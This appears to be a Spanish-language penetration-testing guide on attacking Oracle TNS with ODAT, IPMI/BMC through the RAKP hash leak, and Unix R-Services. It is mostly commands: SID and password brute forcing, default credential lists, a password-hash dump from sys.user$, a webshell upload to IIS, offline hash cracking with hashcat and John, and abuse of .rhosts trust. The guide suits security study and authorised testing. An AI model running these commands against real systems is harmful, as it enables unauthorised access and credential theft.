---
title: "Oracle TNS, IPMI / BMC y R-Services"
pubDate: '2026-08-26'
---

Guía técnica de enumeración y explotación de servicios especializados: gestor de base de datos Oracle TNS (con ODAT), interfaces de gestión de hardware fuera de banda (IPMI/BMC con ataque RAKP) y servicios de confianza Unix R-Services.

---

## 🗄️ 1. Oracle TNS (Puerto 1521 TCP)

En Oracle RDBMS, un Identificador de Sistema (**SID**) es un nombre único que identifica una instancia de la base de datos. Sin conocer un SID válido, es imposible autenticarse contra el servicio.

### Ficheros de Configuración Clave
* **`tnsnames.ora` (Lado Cliente):** Mapea nombres de servicio y alias (ej. `ORCL`, `XE`) con la IP, puerto y protocolo.
* **`listener.ora` (Lado Servidor):** Define interfaces y puertos de escucha del proceso *Listener*.
* **Ruta por defecto:** `$ORACLE_HOME/network/admin` o `C:\oracle`.

### Credenciales y SIDs por Defecto Habituales
* **Oracle 9/10/11g:** `scott:tiger`, `sys:change_on_install`, `system:manager`, `dbsnmp:dbsnmp`.
* **SIDs comunes:** `XE`, `ORCL`, `ORCLPDB1`, `PROD`, `TEST`.

### Instalación de la Suite ODAT (Oracle Database Attacking Tool)
```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1 python3-scapy libgmp-dev

cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build && sudo python3 setup.py install

cd ~
git clone https://github.com/quentinhardy/odat.git && cd odat/
pip3 install python-libnmap colorlog termcolor passlib pycryptodome openpyxl
git submodule init && git submodule update
./odat.py -h
```

### Enumeración, Fuerza Bruta y Explotación con ODAT
```bash
# 1. Fuerza bruta de SIDs con Nmap
sudo nmap -p1521 -sV <TARGET_IP> --open --script oracle-sid-brute

# 2. Enumeración completa con ODAT (SIDs, credenciales por defecto, CVEs y módulos)
./odat.py all -s <TARGET_IP>

# 3. Fuerza bruta de contraseñas con SID conocido (ej. XE)
./odat.py passwordguesser -s <TARGET_IP> -d XE
```

### Interacción con `sqlplus` y Escalada de Privilegios
```bash
# Instalación del cliente SQLPlus
sudo apt install oracle-instantclient-sqlplus -y

# Si ocurre el error 'libsqlplus.so: cannot open shared object file':
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig

# Conexión estándar: sqlplus usuario/password@IP:PUERTO/SID
sqlplus scott/tiger@<TARGET_IP>:1521/XE

# Conexión con Privilegios Máximos de Administrador (SYSDBA)
sqlplus scott/tiger@<TARGET_IP>:1521/XE as sysdba
```

### Consultas SQL y Extracción de Hashes en Oracle:
```sql
select table_name from all_tables;                   -- Listar tablas accesibles
select * from user_role_privs;                       -- Ver roles asignados al usuario actual
select name, password from sys.user$;                -- Volcar hashes de contraseñas (requiere SYSDBA)
```

### Subida Arbitraria de Archivos con Módulo `utlfile` (WebShell):
```bash
# Subir un archivo al directorio web de Windows (IIS) abusando del paquete UTL_FILE
./odat.py utlfile -s <TARGET_IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
curl http://<TARGET_IP>/shell.aspx
```

---

## ⚡ 2. IPMI / BMC (Puerto 623 UDP)

**IPMI (Intelligent Platform Management Interface)** es el estándar de gestión fuera de banda utilizado por tarjetas de administración remota de servidores físicos como **HP iLO**, **Dell iDRAC** y **Supermicro IPMI**.

### Reconocimiento y Detección de Versión
```bash
sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>

# Escaneo con Metasploit
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set RHOSTS <TARGET_IP>
msf6 > run
```

### Credenciales por Defecto Habituales
| Fabricante / Dispositivo | Usuario | Contraseña |
| :--- | :--- | :--- |
| **Dell iDRAC** | `root` | `calvin` |
| **Supermicro IPMI** | `ADMIN` | `ADMIN` |
| **HP iLO** | `Administrator` | Cadena aleatoria de 8 caracteres alfanumérica |

### Vulnerabilidad RAKP de IPMI 2.0 (Volcado y Cracking de Hashes)
En el protocolo RAKP de IPMI 2.0, el servidor devuelve un hash SHA1 o MD5 salted de la contraseña de cualquier usuario válido **antes** de que el cliente se autentique:

```bash
# 1. Volcar hashes de usuarios válidos con Metasploit
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <TARGET_IP>
msf6 > run
```

### Cracking Offline de Hashes IPMI:
```bash
# Con Hashcat (Modo 7300 - IPMI2 RAKP HMAC-SHA1)
hashcat -m 7300 -a 0 hashes_ipmi.txt /usr/share/wordlists/rockyou.txt

# Ataque de máscara para contraseñas de fábrica HP iLO (8 caracteres alfanuméricos)
hashcat -m 7300 hashes_ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

# Con John the Ripper
john --format=rakp --wordlist=/usr/share/wordlists/rockyou.txt hashes_ipmi.txt
john --show hashes_ipmi.txt
```

---

## 💻 3. R-Services (Puertos 512, 513, 514 TCP)

El conjunto de protocolos Unix **R-Services** (`rlogin`, `rsh`, `rexec`, `rcp`) confía en relaciones de confianza basadas en host y usuario a través de los archivos `/etc/hosts.equiv` y `~/.rhosts`.

| Comando | Puerto | Protocolo | Demonio | Mecanismo de Validación |
| :--- | :--- | :--- | :--- | :--- |
| `rexec` | 512 | TCP | `rexecd` | Ejecución de comandos remota no cifrada con usuario/password. |
| `rlogin` | 513 | TCP | `rlogind` | Inicio de sesión remoto similar a Telnet para sistemas Unix. |
| `rsh` / `rcp` | 514 | TCP | `rshd` | Shell remota o copia de archivos directa sin solicitud de contraseña si existe confianza. |

### Abuso de `/etc/hosts.equiv` y `~/.rhosts`
Si el archivo `.rhosts` de un usuario contiene un comodín `+` (ej. `+ +` o `+ <IP>`), cualquier host puede ejecutar comandos sin credenciales:
```text
# Ejemplo de archivo .rhosts vulnerable:
+ 10.10.14.5
+ +
```

### Interacción y Comprobación:
```bash
# Conexión remota rlogin
rlogin <TARGET_IP> -l <usuario>

# Descubrimiento de usuarios conectados vía difusión R-Services (no requiere login)
rwho
rusers -al <TARGET_IP>
```
